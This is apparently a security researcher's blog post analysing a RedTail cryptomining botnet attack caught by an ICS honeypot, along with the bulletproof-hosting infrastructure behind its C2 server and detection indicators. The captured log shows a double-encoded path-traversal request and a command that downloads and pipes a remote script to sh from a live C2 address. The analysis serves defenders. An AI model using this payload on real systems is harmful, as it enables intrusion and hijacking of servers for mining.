---
title: "RedTail 2026 Cryptomining Botnet Campaign"
date: 2026-02-02
draft: false
description: "Mining botnet in action."
tags: ["crypto", "mining", "botnet", "malware"]
categories: ["general"]
toc: false
---

## Background

I set my ICS/SCADA honeypot (Conpot) up mainly to try and analyze/monitor attacks on industrial systems (this one poses as a PLC for an HVAC system), however the majority of the attempts I've noticed have been opportunistic web-based attacks targeting the associated page on port 80.

Recently, I've noticed some similar looking attacks coming from Asia, both trying to connect to a C2 server.

## Log Analysis

Here is an example of one of the logs I captured:

```bash
2026-02-01 05:50:39,903 HTTP/1.1 POST request from ('101.36.123.102', 46080): 
Path: '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
Headers: [
    ('Host', '134.209.179.94:80'), 
    ('User-Agent', 'libredtail-http'), 
    ('Content-Type', 'text/plain'), 
    ('Content-Length', '119')
]
Payload: (wget --no-check-certificate -qO- https://178.16.55.224/sh || curl -sk https://178.16.55.224/sh) | sh -s apache.selfrep
```

`101.36.123.102` is most likely a compromised system whose owner has zero idea their device is being used as part of a botnet. This is less interesting.

A couple of things did stand out to me, most notably the very suspicious looking User-Agent, `libredtail-http`. This user agent is associated with a known cryptomining malware: RedTail, whose staging server is the same one I noticed: `178[.]16[.]55[.]224`.

Otherwise, the use of `%%32$65` is also an immediate red flag. `%32%65` decodes to 2e, which is the hex for a dot `.`. This is a clever way to bypass filters that might be looking for `%2e` specifically by encoding the percent sign itself or hoping the parser "double-dips" the decoding.

`/cgi-bin/../../../../../../bin/sh` is the decoded path. A classic directory traversal attack, using multiple `../` to traverse up the directory tree, in an attempt to reach `/bin/sh` the system shell, so that it can execute arbitrary shell commands (fetching the malicious script from the staging server). The threat actor is also using the || (OR) command to ensure that if `wget` is not present on the target system, the command falls back to using `curl` instead to fetch the malicious script.

You can also see that at the end, the command indicates that the script is intended to immediately begin scanning for other vulnerable Apache servers to continue infecting. This is the telltale sign of an attempt to add a vulnerable server to a botnet. In this case, the attackers are trying to recruit vulnerable web servers into mining crypto on their behalf.

After I finished analyzing the payload, the C2 IP address, **178[.]16[.]55[.]224**, became the focal point of my investigation.

## WHOIS Analysis: Peeling Back the Layers

Initial WHOIS lookup of 178.16.55.224 revealed registration to **Omegatech LTD**, a company purportedly based in the Seychelles:

```
inetnum:        178.16.55.0 - 178.16.55.255
netname:        OMEGATECH
organisation:   ORG-OL329-RIPE
org-name:       Omegatech LTD
country:        SC
address:        HOUSE OF FRANCIS ROOM 303, ILE DU PORT, MAHE, SEYCHELLES
created:        2025-08-19T16:05:29Z
last-modified:  2026-01-21T12:56:23Z
```

Several red flags immediately emerged from this data:

1. **Recent Creation**: The netblock was allocated in August 2025 and modified as recently as January 2026
2. **Seychelles Registration**: A known jurisdiction for bulletproof hosting operations
3. **Generic Address**: "House of Francis" is a well-known virtual office provider in the Seychelles, serving as the registered address for hundreds of shell companies...

## The Seychelles Shell Company Pattern

The Seychelles has become a preferred jurisdiction for threat actors seeking to obscure malicious infrastructure. As an example, research by Team Cymru on the ELITETEAM bulletproof hosting provider revealed a pattern:

> "ELITETEAM is a bulletproof hosting company purporting to be located in Seychelles. In reality, they more than likely operate out of Russia." - Spamhaus, 2021

This modus operandi is consistent across multiple threat actors:

- **Shell companies** registered in offshore jurisdictions (Seychelles, Panama, Belize)
- **Virtual office addresses** providing legal registration without physical presence  
- **Actual operations** conducted from Russia, China, or other permissive jurisdictions
- **Recent allocations** allowing infrastructure to be quickly burned and replaced

The "House of Francis Room 303" address is particularly telling. This single virtual office location appears in the registration of numerous entities linked to cybercrime infrastructure.

## Attribution Discrepancies and ASN Confusion

During my investigation, I encountered conflicting attribution for this IP address. While the WHOIS data showed **AS202412 (Omegatech LTD)**, several threat intelligence sources referenced the same RedTail C2 infrastructure under **AS214943 (Railnet LLC)**.

Further investigation revealed that AS214943 is operated by **Virtualine Technologies**, a Russia-based bulletproof hosting provider openly advertised on underground forums for:
- Phishing campaigns
- Spam operations  
- Malware hosting
- "DMCA-ignore" services

This discrepancy suggests one of two scenarios:

1. **Infrastructure migration**: The RedTail operators may have migrated between different bulletproof hosting providers (from Railnet to Omegatech or vice versa)
2. **Shared infrastructure**: Both ASNs may be part of a larger bulletproof hosting conglomerate with interconnected operations

The latter is consistent with research from Resecurity on ransomware infrastructure, which documented how Russian-operated hosting providers use networks of shell companies across multiple jurisdictions to obscure beneficial ownership.

## RedTail Malware: Nation-State Sophistication

The RedTail malware family itself exhibits characteristics uncommon in financially-motivated cybercrime:

### Tactical Indicators

**Private Mining Pools**: Unlike typical cryptominers that use public pools, RedTail operators run private mining infrastructure. This requires:
- Significant capital investment
- Ongoing operational costs
- Technical sophistication in pool management

Akamai researchers noted this mirrors tactics used by the **North Korea-linked Lazarus Group**, which conducts cryptocurrency mining operations for state revenue generation.

**Rapid Exploit Integration**: RedTail has demonstrated the ability to weaponize critical vulnerabilities shortly after public disclosure:
- CVE-2024-3400 (PAN-OS) - CVSS 10.0
- CVE-2024-4577 (PHP-CGI) - CVSS 9.8  
- CVE-2024-21887 (Ivanti)
- CVE-2021-44228 (Log4Shell)

This level of operational tempo suggests a well-resourced team with dedicated exploit development capabilities.

**Multi-Architecture Support**: The malware supports x86_64, i686, ARM7, and ARM8 architectures, indicating professional development practices and broad targeting ambitions.

### Advanced Persistence Mechanisms

RedTail employs sophisticated persistence techniques beyond typical cryptominers:

```bash
# Malicious SSH agent for credential harvesting
ssh-agent hijacking for lateral movement

# Cron-based persistence
@reboot execution triggers

# Encrypted C2 communications
JSON-RPC over encrypted channels to mining pools
```

The inclusion of SSH credential theft functionality transforms RedTail from a simple cryptominer into a platform for broader network compromise.

## The North Korea Question

While I cannot definitively attribute this infrastructure to North Korean state actors, several indicators stick out:

### Tactical Similarities to Lazarus Group

1. **Private mining pools**: A documented Lazarus Group technique for revenue generation
2. **Operational investment**: Nation-state level resources evident in infrastructure and development
3. **Credential harvesting**: SSH agent hijacking suggests intelligence collection beyond financial gain

### Shell Company Tradecraft

North Korea has a documented history of using Seychelles-registered shell companies for sanctions evasion:

- **Go Tech Investment Ltd.** (Seychelles) - Used by North Korean front company DHID
- **Blue Sea Business Co. Ltd.** (Wales) - DPRK front company with virtual office address
- Hong Kong and Seychelles serve as primary jurisdictions for DPRK sanctions evasion networks

### Russian-North Korean Cooperation

Recent reporting indicates growing cooperation between Russian and North Korean cyber operations:

- Microsoft documented North Korean actors joining the Qilin ransomware group
- Shared bulletproof hosting infrastructure between Russian and NK threat actors  
- Increasing operational coordination following Russia's 2022 veto of UN sanctions monitoring

However, the sophistication and tactics could equally indicate:
- Russian APT groups with financial motivations
- Cybercriminal organizations with nation-state level resources
- Hybrid operations involving multiple threat actors

## The Bulletproof Hosting Ecosystem

This investigation reveals the critical role of bulletproof hosting in modern cyber operations. The ecosystem operates on several key principles:

### Jurisdictional Arbitrage

Providers leverage weak enforcement in jurisdictions like:
- **Seychelles**: No mutual legal assistance treaties with Five Eyes nations
- **Russia**: Permissive towards cybercrime targeting foreign entities
- **Panama/Belize**: Limited law enforcement cooperation

### Layered Obfuscation

The infrastructure employs multiple layers of concealment:

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Attack Infrastructure                              │
│ RedTail C2 Server: 178.16.55.224                            │
│ Malware Payload: https://178.16.55.224/sh                   │
│ User-Agent: libredtail-http                                 │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 2: Legal Facade                                       │
│ Omegatech LTD (AS202412)                                    │
│ Registration: Seychelles (offshore jurisdiction)            │
│ Address: House of Francis Room 303 (virtual office)         │
│ Website: omegatech.sc (professional MSP facade)             │
│ Created: August 2025 (disposable infrastructure)            │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 3: Transit Provider                                   │
│ Pfcloud UG (AS51396)                                        │
│ Location: Hauzenberg, Germany                               │
│ Role: Provides upstream connectivity                        │
│ Status: Legitimate German hosting provider                  │
│ Also serves: AS214943 (Railnet/Virtualine Technologies)     │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 4: Upstream Transit                                   │
│ AS30823 - Aurologic GmbH (Germany)                          │
│ AS35133 - Hybula                                            │
│ Multiple European Tier-2/3 providers                        │
│ Role: Global internet connectivity                          │
└─────────────────────────────────────────────────────────────┘
                           ↓
┌─────────────────────────────────────────────────────────────┐
│ Layer 5: Internet Backbone                                  │
│ Tier-1 ISPs and Internet Exchange Points                    │
│ Global routing infrastructure                               │
└─────────────────────────────────────────────────────────────┘
```

Notably, Pfcloud UG (Layer 3) serves as transit provider for both:

- AS202412 (Omegatech LTD, Seychelles) - Hosting the RedTail C2
- AS214943 (Railnet LLC / Virtualine Technologies, Russia) - Known bulletproof hosting provider

This shared infrastructure suggests coordination within a broader bulletproof hosting ecosystem. Not just isolated operations.

This pattern also mirrors Team Cymru's findings on ELITETEAM: "purporting to be located in Seychelles" but actually "operating out of Russia" while using European transit providers for connectivity.

### Rapid Infrastructure Turnover

The recent creation dates (August 2025) suggest disposable infrastructure:
- Quick allocation and deployment
- Minimal sunk costs allowing rapid abandonment
- Multiple backup networks ready for migration

## Defensive Implications

Organizations should implement detections for RedTail infrastructure:

**IOCs**
- C2 Server: 178.16.55.224
- Organization: Omegatech LTD (AS202412)
- Alternative Attribution: Railnet LLC (AS214943) 
- User-Agent: libredtail-http
- Malware Family: RedTail cryptominer
- Primary CVE: CVE-2024-4577 (PHP-CGI)

**Host-Based Indicators:**
```bash
# Malicious files
redtail.sh
.redtail
.<random_string> (hidden executables)

# Suspicious cron entries
@reboot jobs pointing to /tmp or /var/tmp

# Modified SSH configuration
Unauthorized authorized_keys entries
```

**Behavioral Indicators:**
- Outbound connections to port 25720/TCP (mining pool)
- High CPU usage from hidden processes
- wget/curl to 178.16.55.224
- Directory traversal in web logs with "libredtail-http" user-agent

The 178.16.55.224 infrastructure exemplifies modern threat actor tradecraft, suggesting well-resourced backing. Whether Russian cybercriminal, North Korean state-sponsored, or hybrid operations, this investigation demonstrates how offshore jurisdictions enable threat actors to operate with impunity.

---

# References

## RedTail Malware Analysis

1. **Akamai Security Research** - "RedTail Crypto-Mining Malware Exploiting Palo Alto Networks Firewall Vulnerability"
   - URL: https://thehackernews.com/2024/05/redtail-crypto-mining-malware.html
   - Date: May 31, 2024
   - Key findings: High level of polish, private mining pools, nation-state indicators

2. **Forescout Research** - "New RedTail Malware Exploited Via PHP Security Vulnerability"
   - URL: https://www.forescout.com/blog/new-redtail-malware-exploited-via-php-security-vulnerability/
   - Date: July 11, 2024
   - Key findings: CVE-2024-4577 exploitation, SSH agent hijacking, XMRig deployment

3. **Mario Candela (ITNEXT)** - "RedTail Cryptominer: First Evidence of Docker API Targeting"
   - URL: https://itnext.io/redtail-cryptominer-first-evidence-of-docker-api-targeting-c061096443f8
   - Date: November 14, 2025
   - Key findings: Docker API targeting, C2 infrastructure analysis, IOC documentation

4. **OffSeq Threat Radar** - "FIRST PUBLIC EVIDENCE: RedTail Cryptominer Targets Docker APIs"
   - URL: https://radar.offseq.com/threat/first-public-evidence-redtail-cryptominer-targets--1a0dfaae
   - Date: November 14, 2025
   - Key findings: Unsecured Docker endpoint exploitation, European infrastructure targets

5. **Digital-Domain TI Blog** - "URGENT THREAT ALERT: Mass Exploitation of Critical PHP Vulnerability (CVE-2024-4577) by RedTail Cryptominer Campaign"
   - URL: https://blog.digital-domain.us/urgent-threat-alert-mass-exploitation-of-critical-php-vulnerability-cve-2024-4577-by-redtail-cryptominer-campaign/
   - Key findings: PHP-CGI exploitation techniques, detection rules, campaign identifiers

6. **Malpedia** - "RedTail (Malware Family)"
   - URL: https://malpedia.caad.fkie.fraunhofer.de/details/elf.redtail
   - Key findings: CVE mapping, XMRIG base, vulnerability exploitation history

## Bulletproof Hosting Infrastructure

7. **Team Cymru** - "Exploring Seychelles: Team Cymru's Tech Adventure"
   - URL: https://www.team-cymru.com/post/seychelles-seychelles-on-the-c-2-shore
   - Date: December 19, 2024
   - Key findings: ELITETEAM analysis, Seychelles shell company patterns, Russian connections

8. **GBHackers** - "Russian Hackers Leverage Bulletproof Hosting to Shift Network Infrastructure"
   - URL: https://gbhackers.com/russian-hackers-leverage-bulletproof-hosting/
   - Date: March 31, 2025
   - Key findings: Railnet LLC/Virtualine Technologies connection, AS214943 operations, UAC-0050/UAC-0006 campaigns

9. **Resecurity** - "Qilin Ransomware and the Ghost Bulletproof Hosting Conglomerate"
   - URL: https://www.resecurity.com/blog/article/qilin-ransomware-and-the-ghost-bulletproof-hosting-conglomerate
   - Key findings: Hong Kong/Russia hosting networks, shell company structures, NK actor recruitment

10. **Vasilis Orlof (Substack)** - "Bulletproof Hosting Hunt"
    - URL: https://intelinsights.substack.com/p/bulletproof-hosting-hunt
    - Date: July 27, 2025
    - Key findings: AS214943 analysis, Lumma malware infrastructure, hosting provider patterns

11. **DIEG.info** - "What is Abuse-Resistant (Bulletproof) Hosting?"
    - URL: https://dieg.info/en/articles-en/bulletproof-hosting/
    - Date: July 11, 2025
    - Key findings: BPH jurisdictions, operational patterns, Seychelles prominence

## North Korea Cyber Operations

12. **CISA** - "HIDDEN COBRA – North Korea's DDoS Botnet Infrastructure"
    - URL: https://www.cisa.gov/news-events/alerts/2017/06/13/hidden-cobra-north-koreas-ddos-botnet-infrastructure
    - Key findings: DeltaCharlie malware, botnet operations, Lazarus Group attribution

13. **U.S. Department of Justice** - "Justice Department Announces Court-Authorized Efforts to Map and Disrupt Botnet Used by North Korean Hackers"
    - URL: https://www.justice.gov/archives/opa/pr/justice-department-announces-court-authorized-efforts-map-and-disrupt-botnet-used-north
    - Date: February 6, 2025
    - Key findings: Joanap botnet, Brambul worm, North Korean infrastructure tactics

14. **PBS Frontline** - "How North Korea Uses Front Companies to Help Evade Sanctions"
    - URL: https://www.pbs.org/wgbh/frontline/article/how-north-korea-uses-front-companies-to-help-evade-sanctions/
    - Date: January 20, 2023
    - Key findings: Shell company networks, Go Tech Investment Ltd (Seychelles), DHID operations

15. **The Conversation** - "Disguised ships and front companies: how North Korea has evaded sanctions to grow a global weapons industry"
    - URL: https://theconversation.com/disguised-ships-and-front-companies-how-north-korea-has-evaded-sanctions-to-grow-a-global-weapons-industry-232716
    - Date: June 4, 2025
    - Key findings: Seychelles/Hong Kong shell companies, sanctions evasion, Russia-NK cooperation

16. **Wikipedia** - "Lazarus Group"
    - URL: https://en.wikipedia.org/wiki/Lazarus_Group
    - Last updated: February 6, 2026
    - Key findings: Attribution history, WannaCry connection, cryptocurrency operations

## Infrastructure and Network Analysis

17. **IPinfo.io** - "AS202412 Omegatech LTD"
    - URL: https://ipinfo.io/AS202412/91.92.243.0/24
    - Key findings: WHOIS data, network allocation details

18. **BGP.HE.NET** - "AS202412 Omegatech LTD - bgp.he.net"
    - URL: https://ipv4.bgp.he.net/AS202412
    - Key findings: BGP routing data, upstream relationships

19. **BGPView** - "AS214943 Railnet LLC BGP Network Information"
    - URL: https://bgpview.io/asn/214943
    - Key findings: Network prefixes, peering relationships, Virtualine Technologies connection

20. **Finance Uncovered** - "Seychelles secrets: Island tourist paradise home to Russia-linked firm exploiting UK laws"
    - URL: https://www.financeuncovered.org/stories/seychelles-secrets-island-tourist-paradise-alpha-consulting-valkovskaya-uk-economic-crime-act
    - Key findings: Alpha Consulting operations, House of Francis virtual office, UK shell companies

21. **Hermes-Kalamos** - "Russia's Shadow Fleet: A Maritime Network to Evade Sanctions"
    - URL: https://www.hermes-kalamos.eu/russias-shadow-fleet-a-maritime-network-to-evade-sanctions-its-operations-destinations-and-comparison-with-the-fleets-of-iran-and-venezuela/
    - Date: August 12, 2025
    - Key findings: Shell company jurisdictions, Seychelles/UAE networks, sanctions evasion tactics

## Malware Repositories and Tracking

22. **GitHub - altilunium/redtail** - "miner.bldbd/xmrig sample"
    - URL: https://github.com/altilunium/redtail
    - Key findings: Malware samples, infection vectors, base64 payload analysis

23. **URLhaus/Malware Filter** - "RedTail C2 Infrastructure"
    - URL: https://malware-filter.gitlab.io/malware-filter/urlhaus-filter-domains-online.txt
    - Key findings: IP blacklisting, 178.16.55.224 documentation

24. **Web Hosting Talk** - "New Suspicious User-Agent: libredtail-http"
    - URL: https://www.webhostingtalk.com/showthread.php?t=1947225
    - Key findings: User-agent identification, August-September 2025 activity window, attack patterns

## Additional Context

25. **Spamhaus** - Quoted in Team Cymru research (2021)
    - Finding: "ELITETEAM is a bulletproof hosting company purporting to be located in Seychelles. In reality, they more than likely operate out of Russia."

26. **Microsoft Threat Intelligence** - Referenced in Resecurity Qilin research
    - Finding: North Korean actors joining Qilin ransomware group

27. **RIPE Database** - WHOIS records for AS202412 and AS214943
    - URL: https://www.ripe.net/
    - Key findings: Organization details, maintainer relationships, creation dates
